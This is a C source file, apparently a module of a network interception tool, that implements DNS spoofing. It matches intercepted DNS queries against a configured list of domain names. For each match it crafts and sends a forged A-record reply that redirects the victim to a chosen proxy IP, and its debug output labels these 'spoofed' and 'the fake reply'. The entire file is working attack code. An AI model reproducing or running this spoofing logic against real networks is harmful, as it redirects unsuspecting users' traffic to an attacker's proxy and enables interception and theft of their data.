/*
    MODULE -- Module to match an FQDN

    Copyright (C) Alberto Ornaghi

    $Id: match_fqdn.c 2859 2010-09-13 09:47:00Z alor $
*/

#include <main.h>
#include <hook.h>
#include <file.h>
#include <send.h>
#include <packet.h>

#include <match.h>
#include <match_fqdn.h>

/* global vars */

static tn_t *fqdn_root;
static pthread_mutex_t root_mutex = PTHREAD_MUTEX_INITIALIZER;

struct in_addr fqdn_reply;

/* proto */

static int dnslist_load(tn_t* list);
static int dnslist_find(const char* string, char *type);
static tn_t *tn_new(const char value, char type);
static tn_t *tn_init(void);
static void tn_free(struct trie_node_t** node);
static int tn_populate(tn_t *node, const char *string, char type);
static int tn_find(tn_t *node, const char *string, char *type);
int check_fqdn(const unsigned char* buf, const unsigned int len, char *type);
void load_fqdn(void);
void match_fqdn_init(void);
void match_fqdn(struct packet_object *po);

/*******************************************/

int dnslist_find(const char* string, char *type)
{
   int ret;

   pthread_mutex_lock(&root_mutex);
   ret = tn_find(fqdn_root, string, type);
   pthread_mutex_unlock(&root_mutex);

   return ret;
}

void tn_free(struct trie_node_t** node)
{
   int i;

   if (*node == NULL)
      return;

   for (i = 0; i < ENTRIES; i++)
      if ((*node)->next[i] != NULL)
         tn_free((struct trie_node_t**)&((*node)->next[i]));

   free(*node);
   *node = NULL;

   return;
}

tn_t *tn_new(const char value, char type)
{
   tn_t *tmp;

   SAFE_CALLOC(tmp, 1, sizeof(tn_t));

   tmp->value = value;
   tmp->type = type;

   int i;
   for (i = 0; i < ENTRIES; i++)
      tmp->next[i] = NULL;

   return tmp;
}

tn_t *tn_init(void)
{
   tn_t *tmp = tn_new('\0', ROOT);
   return tmp;
}

int tn_populate(tn_t *node, const char *string, char type)
{
   char c = toupper(string[0]);
   if (c == '\0')
      return 0; // done with string

   int index = c - DISPLACE;

   node->type = type;

   if (node->next[index] == NULL)
      node->next[index] = tn_new(c, type);

   const char *tail = ++string;
   return tn_populate(node->next[index], tail, type);
}

int tn_find(tn_t *node, const char *string, char* type)
{
   char c = toupper(string[0]);

   if (c == '\0') {
      return 0; // string found
   }

   //printf("Searching for \'%c\'\n", c);

   if (node)
      *type = node->type;

   int index = c - DISPLACE;

   if (node->next[index] == NULL) { // string not found
      //printf("Not matched.\n");
      return -1;
   }

   const char *tail = ++string;
   return tn_find(node->next[index], tail, type);
}

int dnslist_load(tn_t* list)
{
   FILE *fc;
   char line[512];
   int counter = 0;
   char *p, *q;
   char *filename = NULL;
   char tmp[MAX_ASCII_ADDR_LEN];

   filename = GBL_CONF->redirected_fqdn;

   DEBUG_MSG(D_INFO, "load_fqdn: %s", filename);

   ON_ERROR(filename, NULL, "Cannot open a NULL file!");

   /* errors are handled by the function */

   fc = open_data("etc", filename, FOPEN_READ_TEXT);
   ON_ERROR(fc, NULL, "Cannot open %s", filename);

   /* read the file */
   while (fgets(line, 512, fc) != 0) {

      /* trim out the comments */
      if ((p = strchr(line, '#')))
         *p = '\0';

      /* trim out the new line */
      if ((p = strchr(line, '\n')))
         *p = '\0';

      if ((p = strchr(line, '\r')))
         *p = '\0';

      q = line;

      /* trim the initial spaces */
      while (q < line + sizeof(line) && *q == ' ')
         q++;

      /* skip empty lines */
      if (line[0] == '\0' || *q == '\0')
         continue;

      /* special case for the PROXY_IP */
      if (!strncmp(line, "PROXY_IP = ", 11)) {

         /* the "auto" parameter is a special case */
         if (!strncmp(line + strlen("PROXY_IP = "), "auto", 4)) {
            DEBUG_MSG(D_INFO, "PROXY_IP is 'auto', getting ip address from %s...", GBL_CONF->response_iface);
            /* get the address of the response interface. */
            if (send_get_iface_addr(&GBL_NET->proxy_ip) != ESUCCESS) {
               /* if there is an error, report it globally and stop working */
               GBL_NET->network_error = 1;
            } else {
               memcpy(&fqdn_reply.s_addr, &GBL_NET->proxy_ip.addr, IP4_ADDR_LEN);
               GBL_NET->network_error = 0;
            }
         } else {
            /* it is an ip address */
            if (inet_pton(AF_INET, line + strlen("PROXY_IP = "), &fqdn_reply) <= 0) {
               DEBUG_MSG(D_ERROR, "Invalid PROXY_IP in %s", GBL_CONF->redirected_fqdn);
               GBL_NET->network_error = 1;
            } else {
               /* remember the proxy ip address to be skipped during ip analysis */
               ip_addr_init(&GBL_NET->proxy_ip, AF_INET, (u_char *)&fqdn_reply);
               GBL_NET->network_error = 0;
            }
         }

         if (GBL_NET->network_error == 0)
            DEBUG_MSG(D_INFO, "PROXY_IP for FQDN is : [%s]", ip_addr_ntoa(&GBL_NET->proxy_ip, tmp));
         else
            DEBUG_MSG(D_ERROR, "PROXY_IP [%s] is invalid, cannot operate", ip_addr_ntoa(&GBL_NET->proxy_ip, tmp));

         continue;
      }

      /* insert fqdn into trie */
      tn_populate(list, line, FQDN);

      /* update the line count */
      counter++;
   }

   fclose(fc);

   DEBUG_MSG(D_INFO, "List of redirected FQDN contains : %04d entries.", counter);

   return 0;
}

void fqdn_append(char *host)
{
   pthread_mutex_lock(&root_mutex);
    /* insert fqdn into trie */
    tn_populate(fqdn_root, host, FQDN);
   pthread_mutex_unlock(&root_mutex);
}

void load_fqdn(void)
{
   tn_t *tmp;
   tn_t *tbf;

   tmp = tn_init();

   /* load the list of FQDN */
   if (dnslist_load(tmp) == -1) {
      free(tmp);
      return;
   }

   /* save the new root */
   pthread_mutex_lock(&root_mutex);
   tbf = fqdn_root;
   fqdn_root = tmp;
   pthread_mutex_unlock(&root_mutex);

   /* free the old root */
   if (tbf)
      tn_free(&tbf);

   return;
}


void match_fqdn(struct packet_object *po)
{
   struct dns_header *dns = (struct dns_header *)po->DATA.data;
   u_char *data, *end;
   char name[NS_MAXDNAME] = {0};
   int name_len = 0;
   u_char *q;
   int16 class;
   u_int16 type;
   char match_type = 0;
#if 0
   struct timeval ts;
   struct timeval diff;
#endif

   /* ignore packets on ports different from 53 */
   if (po->L4.dst != htons(53))
      return;

   data = (unsigned char*)(dns + 1);
   end = (unsigned char*)(po->DATA.data + po->DATA.len);

#if 0
   gettimeofday(&ts, NULL);
   time_sub(&ts, &po->ts, &diff);
   DEBUG_MSG(D_VERBOSE, "dns_spoof time stack: %u.%06u\n", (u_int)diff.tv_sec, (u_int)diff.tv_usec);
#endif
   /* extract the name from the packet */
   name_len = dn_expand((u_char *)dns, end, data, name, NS_MAXDNAME);
   if (name_len == -1) {
      DEBUG_MSG(D_ERROR, "error in dn_expand!\n");
      return;
   }
#if 0
   gettimeofday(&ts, NULL);
   time_sub(&ts, &po->ts, &diff);
   DEBUG_MSG(D_VERBOSE, "dns_spoof time expand: %u.%06u\n", (u_int)diff.tv_sec, (u_int)diff.tv_usec);
#endif

   DEBUG_MSG(D_VERBOSE, "DNS: [%s]", name);

   /* check if fqdn is redirected, if not return, otherwise send proper reply */
   if (dnslist_find(name, &match_type) == -1)
      return;

#if 0
   gettimeofday(&ts, NULL);
   time_sub(&ts, &po->ts, &diff);
   DEBUG_MSG(D_VERBOSE, "dns_spoof time find: %u.%06u\n", (u_int)diff.tv_sec, (u_int)diff.tv_usec);
#endif

   q = data + name_len;

   /* get the type and class */
   NS_GET16(type, q);
   NS_GET16(class, q);

   /* handle only internet class */
   if (class != ns_c_in)
      return;

   /* select the correct reply ip */
   switch(match_type) {
      case FQDN:
         DEBUG_MSG(D_DEBUG, "Address matched REDIRECTED FQDN: %s", name);
         break;
   }

   //printf("qr %d, opcode %d, num %d, ans %d\n", dns->qr, dns->opcode, htons(dns->num_q), htons(dns->num_answer) );

   /* we are interested only in DNS query */
   if ( (!dns->qr) && dns->opcode == ns_o_query && htons(dns->num_q) == 1 && htons(dns->num_answer) == 0) {

      /* it is an address resolution (name to ip) */
      if (type == ns_t_a) {

         u_int8 answer[(q - data) + 16];
         unsigned char *p = answer + (q - data);

         /*
          * fill the buffer with the content of the request
          * we will append the answer just after the request
          */
         memcpy(answer, data, q - data);

         /* prepare the answer */
         memcpy(p, "\xc0\x0c", 2);                        /* compressed name offset */
         memcpy(p + 2, "\x00\x01", 2);                    /* type A (host address) */
         memcpy(p + 4, "\x00\x01", 2);                    /* class 1 (Internet) */
         memcpy(p + 6, "\x00\x00\x0e\x10", 4);            /* TTL (1 hour) */
         memcpy(p + 10, "\x00\x04", 2);                   /* datalen (4 bytes, unsigned int) */
         switch(match_type) {
            case FQDN:
               memcpy(p + 12, &fqdn_reply.s_addr, 4);                /* data (ip address in nbo) */
               DEBUG_MSG(D_DEBUG, "dns_spoof: [%s] spoofed to [%s]\n", name, inet_ntoa(fqdn_reply));
               break;
         }
         /* send the fake reply */
         send_dns_reply(po->L4.src, &po->L3.dst, &po->L3.src, ntohs(dns->id), answer, sizeof(answer), 0);

         GBL_STATS->redir_fqdn++;
#if 0
         gettimeofday(&ts, NULL);
         time_sub(&ts, &po->ts, &diff);
         DEBUG_MSG(D_VERBOSE, "dns_spoof time sent: %u.%06u\n", (u_int)diff.tv_sec, (u_int)diff.tv_usec);
#endif
      }
   }
}

void match_fqdn_init(void)
{
   DEBUG_MSG(D_INFO, "match_fqdn_init");

   hook_add(HOOK_PACKET_UDP, &match_fqdn);
}


/* EOF */

// vim:ts=3:expandtab

